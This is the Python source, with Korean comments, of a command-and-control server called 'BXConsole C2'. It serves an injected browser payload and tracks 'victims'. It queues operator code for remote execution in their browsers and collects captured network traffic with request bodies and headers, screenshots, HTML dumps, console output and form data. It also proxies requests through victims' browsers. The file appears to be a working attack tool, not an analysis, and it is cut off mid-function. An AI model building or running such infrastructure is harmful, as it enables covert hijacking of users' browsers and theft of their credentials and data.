#!/usr/bin/env python3
"""BXConsole C2 v0.2 — 네트워크 훅 캡처 + 브라우저 프록시 결과 수집.

실행:  python3 c2/server.py            (포트 7700, BX_C2_PORT 로 조정)
엔드포인트:
  GET  /bx.js        페이로드 (C2 주소 자동 치환)
  GET  /sse?id=      SSE 채널 — 연결 중이면 /cmd 폴링은 빈 배열 반환 (단일 전달 보장)
  GET  /cmd?id=      폴링 폴백 (SSE 미연결 시에만 명령 전달)
  POST /b/<tag>      비컨 수집 — result 수신 시 명령 상태를 실행완료(DONE)로 갱신
  GET  /api/state    운영자 콘솔 상태 — commands(명령 테이블) 포함
  GET  /api/net?id=  피해자 네트워크 캡처 목록 (v0.2)
  GET  /api/proxy?rid= 브라우저 프록시 결과 조회 (v0.2)
  POST /api/send     명령 큐잉 {id, cmd}
  GET  /bxconsole    운영자 웹 콘솔 (구 /op → 302 리다이렉트)
명령 상태: QUEUED(대기) → SENT(피해자 전달) → DONE(실행·결과 수신)
"""
import http.server, socketserver, json, time, os, sys, re, base64, shutil, ssl, urllib.parse, random, string, threading

PORT  = int(os.environ.get("BX_C2_PORT", "7700"))
ROOT  = os.path.dirname(os.path.abspath(__file__))
PAYLOAD = os.path.join(ROOT, "..", "payload", "bx.js")
OPHTML  = os.path.join(ROOT, "op.html")
EVID    = os.path.join(ROOT, "..", "evidence")

VICTIMS = {}   # id → {first,last,url,mode,ua}
CONSOLE = {}   # id → [{t,level,text}] 피해자 콘솔 버퍼 (최근 50)
CLOSED  = {}   # vid → 닫기 시점 부트 난수 (같은 인스턴스 무시, 새로고침 부활)
NAMES   = {}   # id → 표시명 (names.json 영속)
NAMES_FILE  = os.path.join(ROOT, "names.json")
CONFIG_FILE = os.path.join(ROOT, "config.json")
CMDS    = {}   # cid → {vid, code, state, t_queued, t_sent, t_done, out}
QUEUE   = {}   # id → [ {cid, code} ]        대기 명령
SSE     = {}   # id → [wfile]                현재 연결된 SSE (단일 채널 판단)
# v0.2
NET     = {}   # id → [{method,url,status,body,ms,t}]  최근 100
PROXY   = {}   # rid → [{n,total,body,status,url,t}]   청크 조립용
PROBES  = []   # /bx.js · /probe* 로드 기록 — 연결성 확인 (RequestBin 스타일)
# v0.3 — 자동 수집
PAGEINFO   = {}   # vid → {referrer,lang,platform,screen,viewport,ss,meta,forms}
HTMLDUMP   = {}   # vid → {"chunks":{n:str}, "total":int, "assembled":str}
SCREENSHOT = {}   # vid → {"chunks":{n:str}, "total":int, "data":b64str}
CONFIG  = {"screenshot": True, "html": True, "pageinfo": True,
           "notify_tg_token": "", "notify_tg_chat": ""}
LOG     = []
DELETED = set()   # permanently deleted vids — never re-added even if beacon arrives
LOCK    = threading.Lock()

SESSIONS_DIR = os.path.join(ROOT, "..", "sessions")
TRASH_DIR    = os.path.join(SESSIONS_DIR, ".trash")
PURGED_FILE  = os.path.join(SESSIONS_DIR, ".purged.json")
PURGED  = set()   # 완전파기된 vid — 비컨 영구 무시 (재시작 유지, 고스트 차단)
TRASH   = {}      # vid → {name, first, last, closed}  휴지통 표시용

def sanitize_vid(raw):
    """vid를 안전한 디렉터리명으로 제한 (path traversal 차단)."""
    return re.sub(r"[^A-Za-z0-9_-]", "", str(raw or ""))[:32]

def session_dir(vid):
    return os.path.join(SESSIONS_DIR, vid)

def trash_dir(vid):
    return os.path.join(TRASH_DIR, vid)

def save_purged():
    try:
        json.dump(sorted(PURGED), open(PURGED_FILE, "w"))
    except Exception:
        pass

def _trash_index(vid, d):
    """휴지통 표시용 메타 추출 (meta.json 읽어 name/기간 보존)."""
    try:
        meta = json.load(open(os.path.join(d, "meta.json"), encoding='utf-8'))
    except Exception:
        meta = {}
    TRASH[vid] = {"name": meta.get("display_name") or meta.get("name") or vid,
                  "first": meta.get("first", ""), "last": meta.get("last", ""),
                  "closed": bool(meta.get("closed"))}

def _swrite(vid, filename, data, mode='a'):
    """Write/append data to sessions/{vid}/{filename}. No-op if vid is empty."""
    if not vid:
        return
    d = session_dir(vid)
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, filename), mode, encoding='utf-8') as f:
        f.write(data)

def save_session_meta(vid):
    """Overwrite sessions/{vid}/meta.json with current in-memory state. Call under LOCK."""
    meta = {"vid": vid}
    if vid in VICTIMS:
        meta.update(VICTIMS[vid])
        meta["closed"] = False
    elif vid in CLOSED:
        meta["closed"] = True
        meta["bn"] = CLOSED[vid]
    if vid in NAMES:
        meta["display_name"] = NAMES[vid]
    _swrite(vid, "meta.json", json.dumps(meta, ensure_ascii=False, indent=2), 'w')

def _register_from_meta(vid, d):
    """세션(또는 휴지통) 디렉터리의 메타·파생 파일을 메모리로 복원."""
    meta_path = os.path.join(d, "meta.json")
    if not os.path.exists(meta_path):
        return False
    try:
        meta = json.load(open(meta_path, encoding='utf-8'))
    except Exception:
        return False
    vc = {k: v for k, v in meta.items()
          if k not in ("vid", "display_name", "closed", "bn", "deleted")}
    if meta.get("closed"):
        CLOSED[vid] = meta.get("bn")
    else:
        VICTIMS[vid] = vc
    if meta.get("display_name"):
        NAMES[vid] = meta["display_name"]
    # commands — DONE 복원, 미완료(QUEUED/SENT)는 재큐 (in-flight 명령 보존)
    cp = os.path.join(d, "commands.jsonl")
    if os.path.exists(cp):
        last = {}
        for line in open(cp, encoding='utf-8'):
            try:
                cmd = json.loads(line.strip())
                cid_key = cmd.pop("cid", None)
                if cid_key: last[cid_key] = cmd      # cid별 최종 상태만 채택
            except Exception: pass
        for cid_key, cmd in last.items():
            if cmd.get("state") == "DONE":
                CMDS[cid_key] = cmd
            elif (cmd.get("vid") and cmd.get("code")
                  and cmd["vid"] not in CLOSED and cmd["vid"] in VICTIMS):
                cmd.update(state="QUEUED", t_sent="", t_sent_epoch=None)
                CMDS[cid_key] = cmd
                QUEUE.setdefault(cmd["vid"], []).append({"cid": cid_key, "code": cmd["code"]})
    # console (keep last 50)
    cp = os.path.join(d, "console.jsonl")
    if os.path.exists(cp):
        rows = []
        for line in open(cp, encoding='utf-8'):
            try: rows.append(json.loads(line.strip()))
            except Exception: pass
        if rows:
            CONSOLE[vid] = rows[-50:]
    # net (keep last 100)
    np_ = os.path.join(d, "net.jsonl")
    if os.path.exists(np_):
        rows = []
        for line in open(np_, encoding='utf-8'):
            try: rows.append(json.loads(line.strip()))
            except Exception: pass
        if rows:
            NET[vid] = rows[-100:]
    # pageinfo
    pp = os.path.join(d, "pageinfo.json")
    if os.path.exists(pp):
        try: PAGEINFO[vid] = json.load(open(pp, encoding='utf-8'))
        except Exception: pass
    # screenshot — 신규 바이너리 jpg 우선, 구버전 .b64는 마이그레이션
    sp  = os.path.join(d, "screenshot.jpg")
    sp64 = os.path.join(d, "screenshot.b64")
    try:
        if os.path.exists(sp):
            b64 = base64.b64encode(open(sp, "rb").read()).decode()
            if b64: SCREENSHOT[vid] = {"data": b64}
        elif os.path.exists(sp64):
            data = open(sp64, encoding='utf-8').read().strip()
            if data:
                SCREENSHOT[vid] = {"data": data}
                open(sp, "wb").write(base64.b64decode(data))
                os.remove(sp64)
    except Exception: pass
    # htmldump
    hp = os.path.join(d, "htmldump.html")
    if os.path.exists(hp):
        try:
            data = open(hp, encoding='utf-8').read()
            if data: HTMLDUMP[vid] = {"assembled": data}
        except Exception: pass
    return True

def load_sessions():
    """재시작 시 디스크의 세션 워크스페이스를 메모리로 복원."""
    if os.path.exists(PURGED_FILE):
        try: PURGED.update(json.load(open(PURGED_FILE)))
        except Exception: PURGED.clear()
    DELETED.update(PURGED)
    os.makedirs(TRASH_DIR, exist_ok=True)
    if os.path.exists(SESSIONS_DIR):
        for vid in os.listdir(SESSIONS_DIR):
            d = os.path.join(SESSIONS_DIR, vid)
            if not os.path.isdir(d) or vid.startswith("."):
                continue
            # 구버전 in-place 톰스톤(meta.json deleted:true) → 휴지통 이동 (마이그레이션)
            try:
                if json.load(open(os.path.join(d, "meta.json"), encoding='utf-8')).get("deleted"):
                    dst = trash_dir(vid)
                    if os.path.exists(dst): shutil.rmtree(dst)
                    os.rename(d, dst)
                    DELETED.add(vid)
                    _trash_index(vid, dst)
                    continue
            except Exception:
                pass
            _register_from_meta(vid, d)
    # 휴지통 스캔 — 숨김 상태 유지
    for vid in os.listdir(TRASH_DIR):
        d = os.path.join(TRASH_DIR, vid)
        if os.path.isdir(d):
            DELETED.add(vid)
            _trash_index(vid, d)

def cid():
    return time.strftime("%H%M%S") + "".join(random.choices(string.ascii_lowercase, k=3))

def load_names():
    global NAMES
    if os.path.exists(NAMES_FILE):
        try: NAMES = json.load(open(NAMES_FILE))
        except Exception: NAMES = {}
def save_names():
    json.dump(NAMES, open(NAMES_FILE, "w"), ensure_ascii=False)

def load_config():
    global CONFIG
    if os.path.exists(CONFIG_FILE):
        try:
            saved = json.load(open(CONFIG_FILE))
            CONFIG.update({k: v for k, v in saved.items() if k in CONFIG})
        except Exception: pass
def save_config():
    json.dump(CONFIG, open(CONFIG_FILE, "w"), ensure_ascii=False)

def evidence(rec):
    os.makedirs(EVID, exist_ok=True)
    with open(os.path.join(EVID, "sessions-" + time.strftime("%Y%m%d") + ".jsonl"), "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")

def _requeue_sent(vid):
    """SENT 상태로 묶인 명령을 QUEUED로 되돌려 재전달 허용.
    새 SSE 연결이나 새 페이지 로드(bn 변경) 때 호출 — LOCK 보유 상태에서 호출."""
    requeue = [(c_cid, c_data) for c_cid, c_data in CMDS.items()
               if c_data["vid"] == vid and c_data["state"] == "SENT"]
    for c_cid, c_data in sorted(requeue, key=lambda x: x[1].get("t_sent", "")):
        c_data.update(state="QUEUED", t_sent="")
        QUEUE.setdefault(vid, []).insert(0, {"cid": c_cid, "code": c_data["code"]})

def assemble_proxy(rid):
    """청크가 모두 도착했으면 조립된 본문 반환, 아니면 None."""
    chunks = PROXY.get(rid, [])
    if not chunks: return None
    total = chunks[0].get("total", 1)
    if len(chunks) < total: return None
    chunks_sorted = sorted(chunks, key=lambda c: c.get("n", 0))
    return {
        "rid": rid, "url": chunks_sorted[0].get("url", ""),
        "status": chunks_sorted[0].get("status", 0),
        "body": "".join(c.get("body", "") for c in chunks_sorted),
        "t": chunks_sorted[0].get("t", "")
    }

def push(vid, code):
    c = {"cid": cid(), "code": code}
    with LOCK:
        CMDS[c["cid"]] = {"vid": vid, "code": code, "state": "QUEUED",
                          "t_queued": time.strftime("%H:%M:%S"), "t_sent": "",
                          "t_recv": "", "t_done": "", "out": ""}
        QUEUE.setdefault(vid, []).append(c)
        # 큐잉 시점 기록 — 재시작 시 in-flight 명령도 보존
        _swrite(vid, "commands.jsonl",
                json.dumps(dict(CMDS[c["cid"]], cid=c["cid"]), ensure_ascii=False) + "\n")
    return c

def take(vid):
    """대기 명령 인출 + 전달(SENT) 표기. 항상 전달 (SSE 좀비 연결로 인한 굶음 방지 —
    이중 수령은 클라이언트 cid 중복제거로 흡수)."""
    with LOCK:
        arr = QUEUE.get(vid, []); QUEUE[vid] = []
        for m in arr:
            if CMDS[m["cid"]]["state"] == "QUEUED":
                CMDS[m["cid"]].update(state="SENT", t_sent=time.strftime("%H:%M:%S"),
                                       t_sent_epoch=time.time())
    for m in arr:
        LOG.append({"t": time.strftime("%H:%M:%S"), "tag": "sent", "id": vid,
                    "body": f"cid={m['cid']} 전달 (폴링)"})
    return arr

def sse_push(vid, conn):
    """SSE 연결로 대기 명령 푸시. 죽은 연결이면 실패한 명령을 큐에 복원해
    폴링이 다시 전달하게 한다 (굶음 방지)."""
    now = time.strftime("%H:%M:%S")
    with LOCK:
        arr = QUEUE.get(vid, []); QUEUE[vid] = []
        for m in arr:
            if CMDS[m["cid"]]["state"] == "QUEUED":
                CMDS[m["cid"]].update(state="SENT", t_sent=now, t_sent_epoch=time.time())
    for idx, m in enumerate(arr):
        try:
            conn.write(f"data: {json.dumps(m)}\n\n".encode()); conn.flush()
            LOG.append({"t": now, "tag": "sent", "id": vid,
                        "body": f"cid={m['cid']} 전달 (SSE)"})
        except Exception:
            # 이 연결은 사망 — 실패한 것부터 나머지 전부 큐 복원 (다른 연결·폴링이 재전달)
            with LOCK:
                rest = arr[idx:]
                QUEUE.setdefault(vid, [])[:0] = rest
                for m2 in rest:
                    if CMDS.get(m2["cid"]): CMDS[m2["cid"]].update(state="QUEUED", t_sent="")
            raise

def _stale_watcher():
    """30초 이상 SENT에 묶인 명령을 QUEUED로 되돌림 (반영구 TCP 연결로 인한 굶음 방지)."""
    while True:
        time.sleep(15)
        now_t = time.time()
        with LOCK:
            for c_cid, c_data in list(CMDS.items()):
                if c_data["state"] != "SENT" or not c_data.get("t_sent_epoch"):
                    continue
                if now_t - c_data["t_sent_epoch"] > 30:
                    vid = c_data["vid"]
                    c_data.update(state="QUEUED", t_sent="", t_sent_epoch=None)
                    QUEUE.setdefault(vid, []).insert(0, {"cid": c_cid, "code": c_data["code"]})

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _record_hit(self, path):
        """probe/bx.js 로드 기록 — 트리거 확인용 (RequestBin 스타일)."""
        now = time.strftime("%H:%M:%S")
        xfp = (self.headers.get("X-Forwarded-Proto") or "").split(",")[0].strip().lower()
        proto = xfp or ("https" if isinstance(self.connection, ssl.SSLSocket) else "http")
        row = {"t": now, "ip": self.client_address[0],
               "ua": (self.headers.get("User-Agent") or "")[:200],
               "referer": (self.headers.get("Referer") or "")[:300],
               "dest": (self.headers.get("Sec-Fetch-Dest") or "")[:40],
               "site": (self.headers.get("Sec-Fetch-Site") or "")[:40],
               "proto": proto, "path": path[:300]}
        with LOCK:
            PROBES.append(row)
            del PROBES[:-100]
        evidence({"t": time.strftime("%FT%T"), "tag": "probe", "id": "hit",
                  "data": {k: (v[:120] if isinstance(v, str) else v) for k, v in row.items()}})

    def _send(self, code, ctype, body, no_store=False):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        if no_store:
            self.send_header("Cache-Control", "no-store")
            self.send_header("Pragma", "no-cache")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers(); self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "*"); self.end_headers()

    def do_GET(self):
        u = urllib.parse.urlparse(self.path); p, q = u.path, urllib.parse.parse_qs(u.query)
        if p == "/bx.js":
            self._record_hit(self.path)
            host = self.headers.get("Host", f"127.0.0.1:{PORT}")
            # 스킴 자동 감지 — https 페이지에서 mixed content 차단 방지
            # (역프록시: X-Forwarded-Proto / 직접 TLS: SSLSocket / 기본: http)
            xfp = (self.headers.get("X-Forwarded-Proto") or "").split(",")[0].strip().lower()
            proto = xfp or ("https" if isinstance(self.connection, ssl.SSLSocket) else "http")
            js = open(PAYLOAD).read().replace("__C2__", f"{proto}://{host}")
            self._send(200, "application/javascript", js.encode(), no_store=True)
        elif p == "/sse":
            vid = sanitize_vid(q.get("id", [""])[0])
            self.connection.settimeout(15)   # 좀비 연결 조기 감지
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            with LOCK:
                SSE.setdefault(vid, []).append(self.wfile)
                # 새 SSE 연결 = 이전 연결이 죽었을 가능성 → SENT 명령 재큐
                _requeue_sent(vid)
            try:
                while True:
                    sse_push(vid, self.wfile)
                    self.wfile.write(b": ping\n\n"); self.wfile.flush()
                    time.sleep(1)
            except Exception: pass
            finally:
                with LOCK:
                    try: SSE[vid].remove(self.wfile)
                    except Exception: pass
        elif p == "/cmd":
            vid = sanitize_vid(q.get("id", [""])[0])
            self._send(200, "application/json", json.dumps(take(vid)).encode())
        elif p == "/api/net":
            vid = sanitize_vid(q.get("id", [""])[0])
            with LOCK:
                data = list(NET.get(vid, []))
            self._send(200, "application/json", json.dumps(data, ensure_ascii=False).encode())
        elif p == "/api/proxy":
            rid = q.get("rid", [""])[0]
            result = assemble_proxy(rid)
            if result:
                self._send(200, "application/json", json.dumps(result, ensure_ascii=False).encode())
            else:
                chunks_count = len(PROXY.get(rid, []))
                total = PROXY[rid][0].get("total", "?") if PROXY.get(rid) else "?"
                self._send(202, "application/json",
                           json.dumps({"pending": True, "rid": rid,
                                       "received": chunks_count, "total": total}).encode())
        elif p == "/config":
            with LOCK:
                self._send(200, "application/json", json.dumps(CONFIG, ensure_ascii=False).encode(), no_store=True)
        elif p == "/api/screenshot":
            vid = sanitize_vid(q.get("id", [""])[0])
            with LOCK:
                data = SCREENSHOT.get(vid, {}).get("data", "")
            if data:
                self._send(200, "application/json", json.dumps({"data": data}).encode())
            else:
                self._send(404, "application/json", b'{"error":"no screenshot"}')
        elif p == "/api/htmldump":
            vid = sanitize_vid(q.get("id", [""])[0])
            with LOCK:
                data = HTMLDUMP.get(vid, {}).get("assembled", "")
            if data:
                body = data.encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Disposition", f'inline; filename="dump_{vid[:8]}.html"')
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers(); self.wfile.write(body)
            else:
                self._send(404, "text/plain", b"no html dump")
        elif p == "/api/state":
            with LOCK:
                cmds = [dict(v, cid=k) for k, v in
                        sorted(CMDS.items(), key=lambda kv: kv[1]["t_queued"])]
                st = {"victims": {k: v for k, v in VICTIMS.items() if k not in CLOSED and k not in DELETED},
                      "names": NAMES, "closed": [k for k in sorted(CLOSED) if k not in DELETED],
                      "console": {k: v for k, v in CONSOLE.items()},
                      "commands": cmds,
                      "log": LOG[-60:], "sse": {k: len(v) for k, v in SSE.items()},
                      "queue": {k: len(v) for k, v in QUEUE.items() if k not in CLOSED},
                      "queue_items": {k: v for k, v in QUEUE.items() if v and k not in CLOSED},
                      # v0.2
                      "net_count": {k: len(v) for k, v in NET.items() if k not in CLOSED},
                      # v0.3
                      "pageinfo": {k: v for k, v in PAGEINFO.items()},
                      "has_screenshot": [k for k, v in SCREENSHOT.items() if v.get("data")],
                      "has_html": [k for k, v in HTMLDUMP.items() if v.get("assembled")],
                      # 최근 조립 시각 — 슬래시 커맨드가 새 캡처 도착을 감지
                      "shot_t": {k: (v.get("t") or "") for k, v in SCREENSHOT.items()},
                      "html_t": {k: (v.get("t") or "") for k, v in HTMLDUMP.items()},
                      # 휴지통 (soft delete — 복원 가능)
                      "trash": TRASH,
                      "probes_count": len(PROBES)}
            self._send(200, "application/json", json.dumps(st, ensure_ascii=False).encode())
        elif p in ("/probe", "/probe.js", "/probe.css"):
            self._record_hit(self.path)
            if p == "/probe.js":
                self._send(200, "application/javascript", b"1;")
            elif p == "/probe.css":
                self._send(200, "text/css", b"")
            else:
                _gif = base64.b64decode(
                    "R0lGODlhAQABAIAAAAAAAP///yH5BAAAAAAALAAAAAABAAEAAAIBRAA7")
                self._send(200, "image/gif", _gif)
        elif p.startswith("/shot/"):
            vid = sanitize_vid(p.split("/")[2])
            with LOCK:
                data = SCREENSHOT.get(vid, {}).get("data", "")
            body = b""
            if data:
                try: body = base64.b64decode(data)
                except Exception: body = b""
            if body:
                self.send_response(200)
                self.send_header("Content-Type", "image/jpeg")
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers(); self.wfile.write(body)
            else:
                self._send(404, "text/plain", b"no screenshot")
        elif p == "/api/probes":
            with LOCK:
                self._send(200, "application/json", json.dumps(list(PROBES), ensure_ascii=False).encode())
        elif p == "/bxconsole":
            self._send(200, "text/html", open(OPHTML).read().encode())
        elif p == "/op":
            # 구 주소 호환 — 새 엔드포인트로 리다이렉트
            self.send_response(302)
            self.send_header("Location", "/bxconsole")
            self.end_headers()
        else:
            self._send(200, "text/plain", f"BXConsole C2 v0.1.1 — {p}".encode())

    def do_POST(self):
        u = urllib.parse.urlparse(self.path); p = u.path
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n).decode(errors="replace")
        if p.startswith("/b/"):
            tag = p.split("/")[-1]
            try: d = json.loads(raw)
            except Exception: d = {"raw": raw[:300]}
            vid = sanitize_vid(d.get("id")) or "?"; now = time.strftime("%H:%M:%S")
            _bn = d.get("bn")
            if vid in DELETED:                             # permanently deleted — ignore all beacons
                self._send(200, "text/plain", b"ok")
                return
            if vid in CLOSED and CLOSED.get(vid) == _bn:   # 같은 페이지 인스턴스 → 무시
                self._send(200, "text/plain", b"closed")
                return
            if vid in CLOSED:                              # 새 페이지 인스턴스(새로고침) → 부활
                with LOCK: CLOSED.pop(vid, None)
            with LOCK:
                if vid not in VICTIMS:
                    _host = urllib.parse.urlparse(d.get("url", "")).netloc or "?"
                    _title = (d.get("title") or "").strip()
                    _auto = (_title + " · " + _host) if _title else _host
                    VICTIMS[vid] = {"first": now, "name": _auto}   # 자동 네이밍 (수동 변경 시 NAMES가 우선)
                elif _bn and VICTIMS[vid].get("bn") and VICTIMS[vid]["bn"] != _bn:
                    # 같은 피해자 ID로 새 페이지 로드(새로고침) → SENT 명령 재큐
                    _requeue_sent(vid)
                VICTIMS[vid].update({"last": now, "url": d.get("url", ""), "bn": _bn,
                                     "mode": d.get("mode", VICTIMS[vid].get("mode", "")),
                                     "ua": d.get("ua", VICTIMS[vid].get("ua", ""))})
                LOG.append({"t": now, "tag": tag, "id": vid, "body": raw[:600]})
                save_session_meta(vid)
                del LOG[:-200]
            # v0.3: 네트워크 캡처 (요청 바디·헤더·content-type·size·실패·WS/SSE/리소스)
            if tag == "net":
                _nrow = {"method": d.get("method","GET"), "url": d.get("url",""),
                         "status": d.get("status",0),
                         "body": str(d.get("body",""))[:8000],
                         "req_body": str(d.get("req_body",""))[:4000],
                         "req_headers": str(d.get("req_headers",""))[:500],
                         "ct": str(d.get("ct",""))[:200],
                         "size": d.get("size",0), "ms": d.get("ms",0),
                         "err": str(d.get("err",""))[:200],
                         "ro": bool(d.get("ro")), "ws": bool(d.get("ws")),
                         "t": now}
                with LOCK:
                    NET.setdefault(vid, []).append(_nrow)
                    NET[vid] = NET[vid][-100:]
                _swrite(vid, "net.jsonl", json.dumps(_nrow, ensure_ascii=False) + "\n")
                self._send(200, "text/plain", b"ok")
                return
            # v0.2: 브라우저 프록시 청크
            if tag == "proxy":
                rid = d.get("rid", "")
                if rid:
                    with LOCK:
                        PROXY.setdefault(rid, []).append({
                            "n": d.get("n", 0), "total": d.get("total", 1),
                            "body": d.get("body", ""), "status": d.get("status", 0),
                            "url": d.get("url", ""), "t": now
                        })
                    assembled = assemble_proxy(rid)
                    if assembled:
                        evidence({"t": time.strftime("%FT%T"), "tag": "proxy", "id": vid,
                                  "data": {k: (v[:200] if k == "body" else v)
                                           for k, v in assembled.items()}})
                self._send(200, "text/plain", b"ok")
                return
            if tag == "pageinfo" and vid in VICTIMS:
                with LOCK: PAGEINFO[vid] = d
                _swrite(vid, "pageinfo.json", json.dumps(d, ensure_ascii=False, indent=2), 'w')
                evidence({"t": time.strftime("%FT%T"), "tag": "pageinfo", "id": vid,
                          "data": {k: (str(v)[:200] if not isinstance(v, (dict, list)) else v)
                                   for k, v in d.items()}})
                self._send(200, "text/plain", b"ok"); return
            if tag in ("html", "screenshot") and vid in VICTIMS:
                n_idx, total = d.get("n", 0), d.get("total", 1)
                chunk_body = d.get("body", "")
                store = HTMLDUMP if tag == "html" else SCREENSHOT
                assembled_now = None
                with LOCK:
                    if vid not in store:
                        store[vid] = {"chunks": {}, "total": total}
                    store[vid]["chunks"][n_idx] = chunk_body
                    if len(store[vid]["chunks"]) >= store[vid]["total"]:
                        assembled_now = "".join(store[vid]["chunks"].get(i, "")
                                                for i in range(store[vid]["total"]))
                        store[vid]["assembled" if tag == "html" else "data"] = assembled_now
                if assembled_now is not None:
                    store[vid]["t"] = time.strftime("%H:%M:%S")     # /screenshot · /html 신규 캡처 감지용
                    if tag == "html":
                        _swrite(vid, "htmldump.html", assembled_now, 'w')
                    else:
                        # b64 → 바이너리 jpg 저장 (구버전 .b64는 제거)
                        try:
                            os.makedirs(session_dir(vid), exist_ok=True)
                            with open(os.path.join(session_dir(vid), "screenshot.jpg"), "wb") as f:
                                f.write(base64.b64decode(assembled_now))
                            _old64 = os.path.join(session_dir(vid), "screenshot.b64")
                            if os.path.exists(_old64): os.remove(_old64)
                        except Exception:
                            _swrite(vid, "screenshot.b64", assembled_now, 'w')
                self._send(200, "text/plain", b"ok"); return
            if tag == "console" and vid in VICTIMS:
                entry = {"t": now, "level": d.get("level", "log"), "text": str(d.get("text", ""))[:300]}
                with LOCK:
                    CONSOLE.setdefault(vid, []).append(entry)
                    CONSOLE[vid] = CONSOLE[vid][-50:]
                _swrite(vid, "console.jsonl", json.dumps(entry, ensure_ascii=False) + "\n")
                evidence({"t": now, "tag": "console", "id": vid,
                          "body": f"{d.get('level','log')}: {str(d.get('text',''))[:120]}"})
                self._send(200, "text/plain", b"ok")
                return
            if tag == "ack" and d.get("cid"):
                with LOCK:
                    if d["cid"] in CMDS and CMDS[d["cid"]]["state"] in ("QUEUED", "SENT"):
                        CMDS[d["cid"]].update(state="RECV", t_recv=now)
            if tag == "result" and d.get("cid"):
                _cmd_rec = None
                with LOCK:
                    if d["cid"] in CMDS:
                        upd = {"state": "DONE", "t_done": now,
                               "out": str(d.get("out", d.get("err", "")))[:1500]}
                        if d.get("err"): upd["err"] = str(d.get("err"))[:400]
                        if not CMDS[d["cid"]].get("t_recv"): upd["t_recv"] = now
                        CMDS[d["cid"]].update(**upd)
                        _cmd_rec = dict(CMDS[d["cid"]], cid=d["cid"])
                if _cmd_rec:
                    _swrite(_cmd_rec.get("vid", ""), "commands.jsonl",
                            json.dumps(_cmd_rec, ensure_ascii=False) + "\n")
            if tag != "beat":
                evidence({"t": time.strftime("%FT%T"), "tag": tag, "id": vid, "data": d})
            self._send(200, "text/plain", b"ok")
        elif p == "/api/probes/clear":
            with LOCK:
                del PROBES[:]
            self._send(200, "application/json", b'{"ok":true}')
        elif p == "/api/net/clear":
            try: d = json.loads(raw)
            except Exception: d = {}
            vid = sanitize_vid(d.get("id"))
            with LOCK:
                NET.pop(vid, None)
            if vid:
                try:
                    nf = os.path.join(session_dir(vid), "net.jsonl")
                    if os.path.exists(nf): open(nf, "w").close()
                except Exception: pass
            self._send(200, "application/json", b'{"ok":true}')
        elif p == "/api/send":
            try: d = json.loads(raw)
            except Exception: d = {}
            vid = sanitize_vid(d.get("id"))
            with LOCK:
                alive = vid in VICTIMS and vid not in CLOSED
            if not alive:
                self._send(200, "application/json",
                           json.dumps({"ok": False, "error": "No session/closed — open the target page"}).encode())
                return
            m = push(vid, d.get("cmd", ""))
            self._send(200, "application/json", json.dumps(m).encode())
        elif p == "/api/close":
            try: d = json.loads(raw)
            except Exception: d = {}
            vid = sanitize_vid(d.get("id"))
            with LOCK:
                CLOSED[vid] = VICTIMS.get(vid, {}).get("bn")
                VICTIMS.pop(vid, None); QUEUE.pop(vid, None)
                save_session_meta(vid)
            self._send(200, "application/json", b'{"ok":true,"closed":true}')
        elif p == "/api/reopen":
            try: d = json.loads(raw)
            except Exception: d = {}
            with LOCK: CLOSED.pop(sanitize_vid(d.get("id")), None)
            self._send(200, "application/json", b'{"ok":true,"reopened":true}')
        elif p == "/api/delete":
            # soft delete — 세션 디렉터리를 .trash/로 이동 (복원 가능, 비컨은 무시)
            try: d = json.loads(raw)
            except Exception: d = {}
            vid = sanitize_vid(d.get("id"))
            moved = False
            with LOCK:
                if vid:
                    src = session_dir(vid)
                    if os.path.isdir(src):
                        os.makedirs(TRASH_DIR, exist_ok=True)
                        dst = trash_dir(vid)
                        if os.path.exists(dst): shutil.rmtree(dst)
                        try:
                            os.rename(src, dst); moved = True
                            _trash_index(vid, dst)
                        except OSError:
                            pass
                    DELETED.add(vid)
                    VICTIMS.pop(vid, None)
                    CLOSED.pop(vid, None)
                    QUEUE.pop(vid, None)
                    SSE.pop(vid, None)
                    for k in [k for k, v in CMDS.items() if v.get("vid") == vid]:
                        del CMDS[k]
                    CONSOLE.pop(vid, None)
                    NET.pop(vid, None)
                    PAGEINFO.pop(vid, None)
                    SCREENSHOT.pop(vid, None)
                    HTMLDUMP.pop(vid, None)
            evidence({"t": time.strftime("%FT%T"), "tag": "session_delete", "id": vid,
                      "data": {"moved_to_trash": moved}})
            self._send(200, "application/json", b'{"ok":true}')
        elif p == "/api/restore":
            # 휴지통 복원 — .trash/{vid} → sessions/{vid}, 즉시 목록 복귀
            try: d = json.loads(raw)
            except Exception: d = {}
            vid = sanitize_vid(d.get("id"))
            ok = False
            with LOCK:
                src = trash_dir(vid)
                if vid and os.path.isdir(src):
                    dst = session_dir(vid)
                    if os.path.exists(dst): shutil.rmtree(dst)
                    os.rename(src, dst)
                    DELETED.discard(vid)
                    TRASH.pop(vid, None)
                    _register_from_meta(vid, dst)
                    ok = True
            if ok:
                evidence({"t": time.strftime("%FT%T"), "tag": "session_restore", "id": vid, "data": {}})
            self._send(200, "application/json", json.dumps({"ok": ok}).encode())
        elif p == "/api/purge":
            # 완전파기 — 디스크에서 제거 + .purged.json 기록 (재등록 영구 차단)
            try: d = json.loads(raw)
            except Exception: d = {}
            vid = sanitize_vid(d.get("id"))
            removed = 0
            with LOCK:
                if vid:
                    for dd in (session_dir(vid), trash_dir(vid)):
                        if os.path.isdir(dd):
                            shutil.rmtree(dd); removed += 1
                    PURGED.add(vid); DELETED.add(vid)
                    TRASH.pop(vid, None)
                    VICTIMS.pop(vid, None)
                    CLOSED.pop(vid, None)
                    QUEUE.pop(vid, None)
                    SSE.pop(vid, None)
                    for k in [k for k, v in CMDS.items() if v.get("vid") == vid]:
